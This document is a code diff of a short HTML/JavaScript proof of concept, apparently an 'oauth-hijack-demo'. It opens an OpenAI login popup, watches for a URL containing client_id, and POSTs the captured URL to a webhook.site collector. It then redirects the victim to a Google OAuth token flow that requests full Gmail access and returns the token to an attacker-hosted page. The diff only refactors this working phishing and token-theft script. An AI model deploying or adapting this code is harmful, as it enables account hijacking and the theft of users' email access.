@@ -1,31 +1,30 @@
 <script>
   const loginTarget = "https://auth.openai.com/log-in";
-  let win;
+  const webhook = "https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df"; // Replace with your own
 
   function launch() {
-    win = window.open(loginTarget, "_blank", "width=900,height=700");
+    const win = window.open(loginTarget, "_blank", "width=900,height=700");
 
     const interval = setInterval(() => {
       try {
         const redirectedUrl = win.location.href;
 
-        // Check if the OAuth URL with client_id is present
         if (redirectedUrl.includes("client_id")) {
           clearInterval(interval);
 
-          //**** Kindly replace this with your webhook (webhook.site)****
-          fetch("https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df", {
+          // Send captured client_id URL to the webhook
+          fetch(webhook, {
             method: "POST",
             headers: { "Content-Type": "text/plain" },
-            body: redirectedUrl
+            body: `Captured URL: ${redirectedUrl}`
           });
 
-          // Optionally continue to redirect to malicious flow
+          // Optional: Redirect the user to a fake OAuth flow
           win.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F");
         }
       } catch (err) {
-        // Cross-origin frame access blocked until redirected to a same-origin page
+        // Cross-origin access will throw until window becomes same-origin or redirected to attacker-controlled domain
       }
-    }, 500);
+    }, 1000);
   }
 </script>
